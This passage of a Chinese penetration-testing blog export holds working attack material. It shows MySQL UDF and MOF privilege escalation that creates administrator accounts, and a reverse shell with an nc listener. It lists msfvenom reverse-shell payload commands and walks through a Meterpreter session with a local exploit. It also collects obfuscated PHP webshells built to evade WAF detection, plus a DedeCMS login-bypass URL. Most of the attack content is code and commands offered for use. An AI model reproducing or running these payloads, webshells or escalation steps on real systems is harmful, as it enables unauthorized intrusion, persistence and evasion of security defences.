<h3 id="3-2-UDF提权"><a href="#3-2-UDF提权" class="headerlink" title="3.2-UDF提权"></a>3.2-UDF提权</h3><ul>
<li><p>小于5.1版本及大于5.1版本</p>
<ul>
<li>小于5.1版本导出路径：c:/windows</li>
<li>大于5.1版本导出路径：../lib/plugin 不存在需创建</li>
</ul>
</li>
<li><p>脚本提权（大马或提权脚本都可以）</p>
</li>
<li><p>udf提权这是最常见的提权方式了，但是往往在执行过程中老是遇到”Can’t open shared library”的情况，这里我们可以利用NTFS ADS流来解决这个问题。</p>
</li>
<li><p>最常见的是直接使用udf.php此类的工具来执行udf提权，具体如下。<br>连接到mysql以后，先导出udf.dll到c:\windows\system32目录下。</p>
</li>
<li><p>创建相应的函数并执行命令，具体如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> cmdshell <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">'udf.dll'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">'net user waitalone waitalone.cn /add'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">'net localgroup administrators waitalone /add'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> cmdshell; 删除函数</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'cmdshell'</span> 删除函数</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>某些情况下，我们会遇到Can’t open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，但是默认情况下plugin不存在，怎么办？ 还好有大牛研究出了利用NTFS ADS流来创建文件夹的方法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> @@basedir;</span><br><span class="line"></span><br><span class="line">//查找到mysql的目录</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION'</span>;</span><br><span class="line"></span><br><span class="line">//利用NTFS ADS创建lib目录</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION'</span>;</span><br><span class="line">//利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>
<p>执行成功以后再进行导出即可。</p>
</li>
<li><p>反弹端口连接提权</p>
<blockquote>
<p>假如我们扫到了一个mysql的root弱密码，并且可以外连，但是服务器上面的网站又无法Getshell，这时我们怎么办呢？</p>
</blockquote>
<ol>
<li><p>利用mysql客户端工具连接mysql服务器，然后执行下面的操作</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql.exe -h 172.16.10.11 -uroot -p</span><br><span class="line"></span><br><span class="line">Enter password:</span><br><span class="line"></span><br><span class="line">mysql&gt; \. c:\mysql.txt</span><br><span class="line"></span><br><span class="line">mysql&gt;select backshell("YourIP",2010);</span><br></pre></td></tr></table></figure>
</li>
<li><p>本地监听你反弹的端口</p>
<p><code>nc.exe -vv -l -p 2010</code></p>
</li>
</ol>
<ul>
<li>成功后，你将获得一个system权限的cmdshell，其实这个也是利用的UDF提权。</li>
</ul>
</li>
<li><p>参考：</p>
<ul>
<li><a href="http://www.hanfeicool.cn/archives/81" target="_blank" rel="noopener">http://www.hanfeicool.cn/archives/81</a></li>
<li><a href="http://mrsun.blog.51cto.com/881719/280386" target="_blank" rel="noopener">http://mrsun.blog.51cto.com/881719/280386</a></li>
</ul>
</li>
</ul>
<h3 id="3-3-利用mof提权"><a href="#3-3-利用mof提权" class="headerlink" title="3.3-利用mof提权"></a>3.3-利用mof提权</h3><ul>
<li><p>前段时间国外Kingcope大牛发布了mysql远程提权 0day (MySQL Windows Remote System Level Exploit (Stuxnet technique) 0day)，剑心牛对MOF利用进行了分析，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows 管理规范 (WMI) 提供了以下三种方法编译到 WMI 存储库的托管对象格式 (MOF) 文件：</span><br><span class="line">方法 1： 运行 MOF 文件指定为命令行参数将 Mofcomp.exe 文件。</span><br><span class="line">方法 2： 使用 IMofCompiler 接口和 $ CompileFile 方法。</span><br><span class="line">方法 3： 拖放到 %SystemRoot%\System32\Wbem\MOF 文件夹的 MOF 文件。</span><br></pre></td></tr></table></figure>
</li>
<li><p>Microsoft 建议您到存储库编译 MOF 文件使用前两种方法。也就是运行 Mofcomp.exe 文件，或使用 IMofCompiler::CompileFile 方法</p>
</li>
<li><p>第三种方法仅为向后兼容性与早期版本的 WMI 提供，并因为此功能可能不会提供在将来的版本后，不应使用</p>
</li>
<li><p>具体到mysql提权中，我们又该怎么利用呢</p>
<ul>
<li><p>找一个可写目录 上传 mof文件，我这里上传到了 C:/wmpub/nullevt.mof 代码如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription")</span></span><br><span class="line"></span><br><span class="line">instance of __EventFilter <span class="keyword">as</span> $EventFilter</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line"></span><br><span class="line">Name = <span class="string">"filtP2"</span>;</span><br><span class="line"></span><br><span class="line">Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line"></span><br><span class="line"><span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span></span><br><span class="line"></span><br><span class="line"><span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line"></span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer <span class="keyword">as</span> $Consumer</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line"></span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line"></span><br><span class="line">ScriptText =</span><br><span class="line"></span><br><span class="line"><span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user waitalone waitalone.cn /add\")"</span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Consumer = $Consumer;</span><br><span class="line"></span><br><span class="line">Filter = $EventFilter;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">#其中的第18行的命令，上传前请自己更改。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>执行load_file及into dumpfile把文件导出到正确的位置即可</p>
<p><code>select load_file(&#39;C:/wmpub/nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;</code></p>
<ul>
<li>执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-4-mof提权及启动项提权（来自XD）"><a href="#3-4-mof提权及启动项提权（来自XD）" class="headerlink" title="3.4-mof提权及启动项提权（来自XD）"></a>3.4-mof提权及启动项提权（来自XD）</h3><ul>
<li><p>这个：MySQL Windows Remote System Level Exploit (Stuxnet technique) 0day<br><a href="http://www.exploit-db.com/exploits/23083/" target="_blank" rel="noopener">http://www.exploit-db.com/exploits/23083/</a> </p>
</li>
<li><p>大致看了一下，原来是在导出文件的时候出的问题，具体怎么出的问题，表示看mysql的源码不是我能看的来的。</p>
</li>
<li><p>大家都知道，要对方开启mysql的外联，并且有root密码，这种情况只能用来扫肉鸡了，还蛋疼的不行。所以我感觉用在webshell下辅助提权不错，毕竟如果导udf什么相对麻烦了一些。所以就有下面的利用：</p>
</li>
<li><p>找个可写目录，我这里是C:\recycler\，把如下代码写到nullevt.mof文件里（也就是他源码里的payload）： </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#pragma namespace("\\\\.\\root\\subscription") </span></span><br><span class="line"></span><br><span class="line">instance of __EventFilter <span class="keyword">as</span> $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = <span class="string">"Root\\Cimv2"</span>; </span><br><span class="line">    Name  = <span class="string">"filtP2"</span>; </span><br><span class="line">    Query = <span class="string">"Select * From __InstanceModificationEvent "</span> </span><br><span class="line">            <span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span> </span><br><span class="line">            <span class="string">"And TargetInstance.Second = 5"</span>; </span><br><span class="line">    QueryLanguage = <span class="string">"WQL"</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer <span class="keyword">as</span> $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = <span class="string">"consPCSV2"</span>; </span><br><span class="line">    ScriptingEngine = <span class="string">"JScript"</span>; </span><br><span class="line">    ScriptText = </span><br><span class="line">    <span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add\")"</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>注意上面的net.exe user admin admin /add，可以随便改的，想执行啥都行，有没有参数也都行，执行自己的马也行。<br>再然后，在菜刀里连接mysql数据库后执行： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&apos;C:\\RECYCLER\\nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li>再然后。。你会发现用户添加上去了。<br>注：测试环境为windows 2003 + mysql 5.0.45-community-nt<br>win7旗舰版 sp1 + mysql-5.5.28 测试失败，2008未测试。<br>不过那个利用ADS新建\lib\plugin目录的bug还在，还可以利用那个去导udf提权的</li>
</ul>
<h2 id="04-linux提权"><a href="#04-linux提权" class="headerlink" title="04-linux提权"></a>04-linux提权</h2><ul>
<li>相关链接：<ul>
<li><a href="http://www.91ri.org/7911.html" target="_blank" rel="noopener">http://www.91ri.org/7911.html</a></li>
</ul>
</li>
</ul>
<h2 id="05-msf简单使用"><a href="#05-msf简单使用" class="headerlink" title="05-msf简单使用"></a>05-msf简单使用</h2><h3 id="5-1msfvenom"><a href="#5-1msfvenom" class="headerlink" title="5-1msfvenom"></a>5-1msfvenom</h3><ul>
<li><p>MSF Payloads</p>
<ul>
<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exe</code></li>
<li><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.php</code></li>
<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.asp</code></li>
<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\x00&quot; -a x86 --platform win -f c</code></li>
</ul>
</li>
<li><p>MSF 生成在 Linux 下反弹的 Meterpreter Shell</p>
<ul>
<li><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell</code></li>
</ul>
</li>
<li><p>MSF 生成反弹 Shell (C Shellcode)</p>
<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c</code></p>
</li>
<li><p>MSF 生成反弹 Python Shell</p>
<p><code>msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py</code></p>
</li>
<li><p>MSF 生成反弹 ASP Shell</p>
<ul>
<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f asp -a     x86 --platform win -o shell.asp</code></li>
<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f asp -a x86 --platform win -o shell.asp</code></li>
<li><code>root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f asp -a x86 --platform windows -o /root/shell.asp</code></li>
</ul>
</li>
<li><p>MSF 生成反弹 Bash Shell</p>
<ul>
<li><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh</code></li>
</ul>
</li>
<li><p>MSF 生成反弹 PHP Shell</p>
<ul>
<li><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php</code></li>
<li><code>add &lt;?php at the beginning</code></li>
<li><code>perl -i~ -0777pe&#39;s/^/&lt;?php \n/&#39; shell.php</code></li>
</ul>
</li>
<li><p>MSF 生成反弹 Win Shell</p>
<ul>
<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe</code></li>
</ul>
</li>
</ul>
<h3 id="5-2-简单提权步骤"><a href="#5-2-简单提权步骤" class="headerlink" title="5.2-简单提权步骤"></a>5.2-简单提权步骤</h3><ul>
<li><p>第一步：生成反弹脚本或执行文件</p>
<ul>
<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=49.210.187.182 LPORT=4444 -f exe -o /root/door.exe</code></li>
<li>生成执行文件door.exe 绑定地址：49.210.187.182:4444</li>
<li>由于路由器设置了端口转发，将4444端口转发至192.168.1.111</li>
</ul>
</li>
<li><p>第二步：加载msf，监听反弹结果</p>
<ul>
<li><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler 设置接受反弹模块</span><br><span class="line">set payload windows/meterpreter/reverse_tcp 设置反弹结果处理载荷</span><br><span class="line">show options 查看配置选项</span><br><span class="line">Show targets 查看攻击目标</span><br><span class="line">set LHOST 192.168.1.111 设置本地监听地址192.168.1.111</span><br><span class="line">exploit 执行</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>第三步：接受反弹，进行提权操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid （获取当前权限）</span><br><span class="line">Server username: NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">meterpreter &gt; getsystem （尝试提权操作）</span><br><span class="line">[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:</span><br><span class="line">[-] Named Pipe Impersonation (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (Dropper/Admin)</span><br><span class="line">[-] Token Duplication (In Memory/Admin)</span><br><span class="line">meterpreter &gt; background （返回 选择提权exp）</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf exploit(handler) &gt; use exploit/windows/local/ms11_080_afdjoinleaf  (选择提权exp)</span><br><span class="line">msf exploit(ms11_080_afdjoinleaf) &gt; set session 1 （载入当前反弹shell）</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf exploit(ms11_080_afdjoinleaf) &gt; exploit （执行）</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>一句话|菜刀|WAF</title>
    <url>/2018/01/22/web/%E4%B8%80%E5%8F%A5%E8%AF%9D-%E8%8F%9C%E5%88%80-WAF/</url>
    <content><![CDATA[<h1 id="一句话-amp-菜刀-amp-waf"><a href="#一句话-amp-菜刀-amp-waf" class="headerlink" title="一句话&amp;菜刀&amp;waf"></a>一句话&amp;菜刀&amp;waf</h1><h2 id="01-一句话收集"><a href="#01-一句话收集" class="headerlink" title="01-一句话收集"></a>01-一句话收集</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1.1-"></a>1.1-</h3><a id="more"></a>
<ul>
<li><p>原文：<code>https://www.t00ls.net/thread-41384-1-1.html</code></p>
</li>
<li><p>code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $dogkill=strtoupper(<span class="string">'ass'</span>);</span><br><span class="line">    $dogri=strtoupper(<span class="string">'ert'</span>);</span><br><span class="line">    $funcName=strtoupper($dogkill.$dogri);</span><br><span class="line">    $dogkilling=<span class="string">'funcName'</span>;</span><br><span class="line">    @$$dogkilling($_POST[w]);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>关键点：</p>
<ul>
<li>大小写变换；</li>
<li>php动态变量；</li>
</ul>
</li>
</ul>
<h3 id="1-2"><a href="#1-2" class="headerlink" title="1.2-"></a>1.2-</h3><ul>
<li><p>code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span><span class="params">($b,$c)</span></span>&#123;</span><br><span class="line">	$b=strrev($b);</span><br><span class="line">	array_map(substr_replace($b, <span class="string">'ss'</span>, <span class="number">1</span>, <span class="number">0</span>),<span class="keyword">array</span>($c));</span><br><span class="line">&#125;</span><br><span class="line">fun(<span class="string">"trea"</span>,$_POST[<span class="string">'pass'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>关键点</p>
<ul>
<li>构造函数，调用函数；</li>
<li>字符串翻转及子串替换；</li>
<li>array_map函数回调；</li>
</ul>
</li>
<li><p>其它</p>
<ul>
<li>d盾会对base64_decode($_POST[‘T00ls’])中编码函数敏感；其与狗的检测策略不同；</li>
<li>带base64编码的，过狗不一定过盾；</li>
</ul>
</li>
</ul>
<h3 id="1-3"><a href="#1-3" class="headerlink" title="1.3-"></a>1.3-</h3><ul>
<li><p>原文：<code>https://www.t00ls.net/thread-41389-1-1.html</code></p>
</li>
<li><p>code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$payload = <span class="string">&lt;&lt;&lt;s</span></span><br><span class="line"><span class="string">PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwpmdW5jdGlvbiBmdW4oJGIsJGMpewoJJGI9c3RycmV2KCRiKTsKCWFycmF5X21hcChzdWJzdHJfcmVwbGFjZSgkYiwgJ3NzJywgMSwgMCksYXJyYXkoJGMpKTsKfQpmdW4oInRyZWEiLCRfUE9TVFsncGFzcyddKTsKPz4=</span></span><br><span class="line"><span class="string">s;</span></span><br><span class="line">$file = tempnam(sys_get_temp_dir(), <span class="string">''</span>);              </span><br><span class="line">fwrite(fopen($file, <span class="string">'w'</span>), base64_decode($payload));         </span><br><span class="line"><span class="keyword">include</span> $file;         </span><br><span class="line">unlink($file);         </span><br><span class="line">var_dump(file_exists($file)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>注意</p>
<ul>
<li>2中代码base64编码；<br>写入临时缓存文件file，写入文件时base64解码；<br>文件包含；<br>马上删除，并检测是否删除；<br>密码便是2中pass，亲测可行；</li>
<li>也可以对2中代码处<code>fun(&quot;trea&quot;,$_POST[&#39;pass&#39;]);变为fun(&quot;trea&quot;,base64_decode($_POST[&#39;pass&#39;]));</code><br>再将其base编码赋值给base64；<br>加入了base64解码函数，旧版菜刀应付不了，需使用16版并更改配置文件；<br>（见下面菜刀版本相关）</li>
</ul>
</li>
<li><p>小结：</p>
<ul>
<li><code>@eval($_POST[&#39;pass&#39;]);</code>———旧版菜刀；</li>
<li><code>@eval(base64_decode($_POST[&#39;pass&#39;]));</code>————16版并改配置文件；</li>
</ul>
</li>
</ul>
<h2 id="02-过狗相关"><a href="#02-过狗相关" class="headerlink" title="02-过狗相关"></a>02-过狗相关</h2><h3 id="2-1-回调函数过狗"><a href="#2-1-回调函数过狗" class="headerlink" title="2.1-回调函数过狗"></a>2.1-回调函数过狗</h3><ul>
<li><p>相关链接<code>https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</code></p>
</li>
<li><p>常用函数</p>
<ul>
<li><code>call_user_func(&#39;assert&#39;, $_POST[&#39;pass&#39;]);</code></li>
<li><code>call_user_func_array(&#39;assert&#39;, array($_POST[&#39;pass&#39;]));</code></li>
<li><code>array_filter(array($_POST[&#39;pass&#39;]), &#39;assert&#39;);</code></li>
<li><code>array_map(&#39;assert&#39;,array($_POST[&#39;pass&#39;]));</code></li>
</ul>
</li>
<li><p>code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'test'</span>,$_POST[<span class="string">'pass'</span>]);</span><br><span class="line">uasort($a,<span class="string">'assert'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>注意</p>
<ul>
<li>只能传入变量，因此是$a；</li>
<li>assert 在版本5.4.8 增加了参数description，因此加’test’作为参数；</li>
</ul>
</li>
</ul>
<h3 id="2-2-一句话原理及过狗"><a href="#2-2-一句话原理及过狗" class="headerlink" title="2.2-一句话原理及过狗"></a>2.2-一句话原理及过狗</h3><ul>
<li><code>https://bbs.ichunqiu.com/thread-17816-1-1.html</code></li>
<li><code>https://www.t00ls.net/articles-33457.html</code></li>
</ul>
<h3 id="2-3-菜刀配置文件"><a href="#2-3-菜刀配置文件" class="headerlink" title="2.3-菜刀配置文件"></a>2.3-菜刀配置文件</h3><ul>
<li><code>http://www.uedbox.com/caidao-conf-detailed/</code></li>
<li><code>https://www.404sec.com/7512.html</code></li>
<li><code>https://www.scanfsec.com/%E7%AE%80%E5-%8D%95%E4%BD%BF%E7%94%A8%E6%96%B0%E7%89%88%E8%8F%9C%E5%88%80%E8%BF%87waf.html</code>（主）</li>
</ul>
<h3 id="2-4-菜刀配置并过狗"><a href="#2-4-菜刀配置并过狗" class="headerlink" title="2.4-菜刀配置并过狗"></a>2.4-菜刀配置并过狗</h3><ul>
<li>待学习</li>
<li><code>https://www.scanfsec.com/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%96%B0%E7%89%88%E8%8F%9C%E5%88%80%E8%BF%87waf.html</code>（主）</li>
</ul>
<h2 id="03-一句话绕WAF（XD-）"><a href="#03-一句话绕WAF（XD-）" class="headerlink" title="03-一句话绕WAF（XD-）"></a>03-一句话绕WAF（XD-）</h2><ul>
<li><p>几个例子</p>
<ul>
<li><p><code>&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($_POST[&quot;shezhang&quot;]); ?&gt;</code></p>
</li>
<li><p><code>&lt;?php $lang = (string)key($_POST);$lang($_POST[&#39;shezhang&#39;]);?&gt;</code></p>
</li>
<li><p><code>&lt;?php $k=&quot;ass&quot;.&quot;ert&quot;; $k(${&quot;_PO&quot;.&quot;ST&quot;} [&#39;shezhang&#39;]);?&gt;</code></p>
</li>
<li><p><code>&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[&quot;shezhang&quot;]);  ?&gt;</code></p>
</li>
<li><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                  </span><br><span class="line">@$_=<span class="string">"s"</span>.<span class="string">"s"</span>.<span class="comment">/*-/*-*/</span><span class="string">"e"</span>.<span class="comment">/*-/*-*/</span><span class="string">"r"</span>;                  </span><br><span class="line">@$_=<span class="comment">/*-/*-*/</span><span class="string">"a"</span>.<span class="comment">/*-/*-*/</span>$_.<span class="comment">/*-/*-*/</span><span class="string">"t"</span>;                  </span><br><span class="line">@$_<span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">"_P"</span>.<span class="comment">/*-/*-*/</span><span class="string">"OS"</span>.<span class="comment">/*-/*-*/</span><span class="string">"T"</span>&#125;   </span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span>-<span class="comment">/*-/*-*/</span><span class="number">2</span><span class="comment">/*-/*-*/</span>-<span class="comment">/*-/*-*/</span><span class="number">5</span><span class="comment">/*-/*-*/</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?Php</span></span><br><span class="line">$ddlj6=”VDFOVVd5″;$fnvy4=”UUdWMllX”;$olsi8=”d29KRjlR”;$ssay3=”ZDVlR3RqWnpZblhTazc=”;</span><br><span class="line">$lram4 = str_replace(“vh3″,””,”vh3svh3tvh3rvh3_rvh3evh3plvh3avh3ce”);</span><br><span class="line">$sfjr7 = $lram4(“tf4”, “”, “tf4batf4stf4e6tf44tf4_tf4dtf4etf4ctf4otf4dtf4e”);</span><br><span class="line">$icxd7 = $lram4(“hsm1″,””,”hsm1chsm1rehsm1athsm1ehsm1_fhsm1unchsm1thsm1iohsm1n”);</span><br><span class="line">$jmpl7 = $icxd7(”, $sfjr7($sfjr7($lram4(“<span class="comment">#;*,.”, “”, $fnvy4.$olsi8.$ddlj6.$ssay3)))); $jmpl7();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>编写思路</p>
<ul>
<li>关键字打乱</li>
<li>替换更改</li>
<li>猜分组合</li>
<li>编码解码</li>
<li>函数调用</li>
</ul>
</li>
<li><p>实例说明</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a0=$_GET[<span class="string">'a'</span>];<span class="comment">//a=t</span></span><br><span class="line">$t=$_GET[<span class="string">'b'</span>];<span class="comment">//b=assert</span></span><br><span class="line">$$a0($_REQUEST[qq]);</span><br><span class="line"></span><br><span class="line"><span class="comment">##################################</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/test/blfg/cd.php?a=t&amp;b=assert</span></span><br><span class="line"></span><br><span class="line">$a0=’t’</span><br><span class="line">$t=’assert’</span><br><span class="line">$$a0=$t=assert</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>功能型菜刀绕过拦截解决办法</p>
<ul>
<li>自写功能数据包</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>一句话</tag>
        <tag>菜刀</tag>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>其它杂乱漏洞</title>
    <url>/2018/01/22/web/%E5%85%B6%E5%AE%83%E6%9D%82%E4%B9%B1%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="其它漏洞"><a href="#其它漏洞" class="headerlink" title="其它漏洞"></a>其它漏洞</h1><h2 id="01-目录遍历-amp-下载漏洞-amp-变量覆盖"><a href="#01-目录遍历-amp-下载漏洞-amp-变量覆盖" class="headerlink" title="01-目录遍历&amp;下载漏洞&amp;变量覆盖"></a>01-目录遍历&amp;下载漏洞&amp;变量覆盖</h2><ul>
<li><p>目录遍历</p>
<ul>
<li><p>图示</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/73739446.jpg" alt></p>
</li>
</ul>
</li>
</ul>
<a id="more"></a>
<ul>
<li><p>下载漏洞</p>
<ul>
<li>如<code>http://www.test.com.cn/DownLoad.aspx?fileName=1.xls</code></li>
</ul>
</li>
<li><p>变量覆盖</p>
<ul>
<li><p>code</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/34814314.jpg" alt></p>
</li>
<li><p>织梦变量覆盖漏洞</p>
<ul>
<li><p>通过变量覆盖漏洞，覆盖原始数据库配置信息，将数据库重定向，导致免验证进入后台</p>
</li>
<li><p>例子exp</p>
<p><code>http://www.xx.com/后台/login.php?dopost=login&amp;validate=dcug&amp;userid=账号&amp;pwd=密码&amp; _POST[GLOBALS] [cfg_dbhost]=MYSQL外链IP&amp;_POST[GLOBALS][cfg_dbuser]=MYSQL的账号&amp;_POST[GLOBALS][cfg_dbpwd]=MYSQL的密码&amp; _POST[GLOBALS][cfg_dbname]=自己的dedecms的数据库</code></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="02-网站后台查找"><a href="#02-网站后台查找" class="headerlink" title="02-网站后台查找"></a>02-网站后台查找</h2><ul>
<li><p>目录爬行</p>
<ul>
<li>目录爬行工具：wvs，appscan等</li>
</ul>
</li>
<li><p>目录扫描</p>
<ul>
<li>字典扫描，常见工具：wwwscan，御剑等</li>
</ul>
</li>
<li><p>二级域名扫描</p>
<p><a href="http://www.xiaodi8.com" target="_blank" rel="noopener">www.xiaodi8.com</a></p>
<ul>
<li><p>二级目录：</p>
